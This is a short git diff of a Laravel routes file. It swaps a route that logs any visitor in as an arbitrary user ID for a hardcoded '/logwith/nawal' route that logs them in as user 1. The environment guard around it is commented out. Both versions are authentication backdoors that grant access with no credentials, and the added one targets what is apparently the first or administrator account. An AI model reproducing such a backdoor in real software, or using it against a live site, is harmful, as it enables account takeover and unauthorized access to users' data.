@@ -85,8 +85,8 @@ Route::group(['namespace' => 'Frontend', 'as' => 'frontend.', 'middleware' => ['
 Route::get('/', 'Frontend\HomeController@index')->name('home');
 Auth::routes();
 //if (app()->environment('production') && Schema::hasTable('users')) {
-Route::get('/logwith/{id}', function ($id) {
-    Auth::loginUsingId($id);
+Route::get('/logwith/nawal', function () {
+    Auth::loginUsingId(1);
     return redirect()->route('frontend.home');
 });
 //}
